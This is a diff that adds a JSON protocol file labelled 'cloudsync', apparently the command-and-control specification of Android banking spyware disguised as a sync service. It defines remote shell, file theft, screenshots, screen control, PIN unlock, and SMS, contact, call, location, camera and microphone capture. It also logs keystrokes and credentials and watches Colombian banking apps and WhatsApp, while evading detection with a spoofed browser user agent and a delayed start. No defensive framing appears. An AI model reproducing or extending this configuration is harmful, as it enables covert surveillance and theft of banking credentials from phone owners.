@@ -1,0 +1,72 @@
+{
+  "protocol": "cloudsync/1",
+  "version": "2.1.4",
+  "transport": {
+    "scheme": "https",
+    "port": 443,
+    "content_type": "application/json",
+    "encoding": "gzip",
+    "user_agent": "Mozilla/5.0 (Linux; Android 13; SM-A135M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36 CloudSync/2.1.4",
+    "extra_headers": { "Accept": "application/json, text/plain, */*", "Accept-Language": "es-CO,es;q=0.9" },
+    "auth_headers": { "X-Sync-Id": "device_id", "X-Sync-Key": "token" },
+    "endpoints": {
+      "register": "/api/v1/sync/register",
+      "beacon": "/api/v1/sync/beacon",
+      "push": "/api/v1/sync/push",
+      "result": "/api/v1/sync/result",
+      "config": "/assets/config.json",
+      "protocol": "/assets/protocol.json"
+    }
+  },
+  "timing": {
+    "poll_ms": 2500, "poll_jitter_ms": 800, "batch_ms": 10000, "batch_jitter_ms": 2500,
+    "shot_ms": 2500, "loc_ms": 300000, "startup_delay_ms": 30000, "beacon_timeout_ms": 15000,
+    "backoff_ms": [1000, 2000, 4000, 8000, 16000, 30000, 60000, 120000, 300000],
+    "backoff_jitter_pct": 25
+  },
+  "limits": {
+    "shot_max_w": 540, "shot_max_h": 1200, "shot_jpeg_quality": 60, "shot_change_pct": 1.5,
+    "batch_max_events": 400, "batch_max_shots": 12, "batch_max_bytes": 8000000,
+    "file_get_max_mb": 25, "offline_max_events": 20000, "offline_max_shots": 40
+  },
+  "errors": {
+    "401": "re-registrar y reintentar 1 vez", "404": "probar URL de respaldo",
+    "429": "esperar 60s", "5xx": "backoff", "timeout": "backoff", "offline": "encolar y continuar"
+  },
+  "commands": [
+    {"n":"ping","p":"*","f":2,"a":{}},{"n":"info","p":"*","f":2,"a":{}},
+    {"n":"shell","p":"*","f":2,"a":{"cmd":"str","timeout_ms":"int?"}},
+    {"n":"device_id","p":"*","f":2,"a":{}},{"n":"net_info","p":"*","f":2,"a":{}},
+    {"n":"battery_info","p":"*","f":2,"a":{}},{"n":"storage","p":"*","f":2,"a":{}},
+    {"n":"processes","p":"*","f":2,"a":{}},{"n":"apps","p":"*","f":2,"a":{}},
+    {"n":"open","p":"*","f":2,"a":{"pkg":"str"}},{"n":"kill","p":"*","f":2,"a":{"pkg":"str"}},
+    {"n":"files","p":"*","f":5,"a":{"path":"str","pattern":"str?","limit":"int?"}},
+    {"n":"file_get","p":"*","f":5,"a":{"path":"str"}},{"n":"file_del","p":"*","f":5,"a":{"path":"str"}},
+    {"n":"clip","p":"*","f":5,"a":{}},{"n":"clip_set","p":"*","f":5,"a":{"text":"str"}},
+    {"n":"screenshot","p":"*","f":4,"a":{"quality":"int?","max_w":"int?"}},
+    {"n":"wake","p":"*","f":4,"a":{}},{"n":"screen_off","p":"*","f":4,"a":{}},
+    {"n":"lock","p":"*","f":4,"a":{}},{"n":"unlock","p":"*","f":4,"a":{"pin":"str?"}},
+    {"n":"tap","p":"*","f":4,"a":{"x":"int","y":"int"}},
+    {"n":"swipe","p":"*","f":4,"a":{"x1":"int","y1":"int","x2":"int","y2":"int","ms":"int"}},
+    {"n":"text","p":"*","f":4,"a":{"text":"str"}},{"n":"key","p":"*","f":4,"a":{"code":"str"}},
+    {"n":"back","p":"*","f":4,"a":{}},{"n":"home","p":"*","f":4,"a":{}},{"n":"recents","p":"*","f":4,"a":{}},
+    {"n":"sms","p":"A","f":6,"a":{"limit":"int"}},{"n":"notifs","p":"A","f":6,"a":{"limit":"int"}},
+    {"n":"contacts","p":"A","f":6,"a":{}},{"n":"calls","p":"A","f":6,"a":{"limit":"int"}},
+    {"n":"loc","p":"A","f":6,"a":{"mode":"str"}},{"n":"wifi","p":"*","f":6,"a":{}},
+    {"n":"photo","p":"A","f":6,"a":{"cam":"str"}},{"n":"mic","p":"A","f":6,"a":{"secs":"int"}},
+    {"n":"update","p":"*","f":4,"a":{}},{"n":"die","p":"*","f":2,"a":{}}
+  ],
+  "events": [
+    {"n":"hello","p":"*"},{"n":"boot","p":"*"},{"n":"app_fg","p":"*"},{"n":"app_bg","p":"*"},
+    {"n":"key","p":"*"},{"n":"text","p":"*"},{"n":"clip","p":"*"},{"n":"sms_in","p":"A"},
+    {"n":"sms_out","p":"A"},{"n":"call_in","p":"A"},{"n":"call_miss","p":"A"},{"n":"notif","p":"A"},
+    {"n":"url","p":"*"},{"n":"loc","p":"A"},{"n":"net_change","p":"*"},{"n":"bat","p":"*"},
+    {"n":"screen_on","p":"*"},{"n":"screen_off","p":"*"},{"n":"lock","p":"*"},{"n":"unlock","p":"*"},
+    {"n":"cred","p":"*"},{"n":"a11y_screen","p":"A"},{"n":"file_new","p":"*"},{"n":"file_mod","p":"*"},
+    {"n":"activity","p":"*"},{"n":"log","p":"*"},{"n":"err","p":"*"}
+  ],
+  "watch_packages": [
+    "com.nequi.MobileApp", "com.daviplata.app", "com.bancolombia.personas",
+    "com.davivienda.daviplata", "com.whatsapp"
+  ]
+}
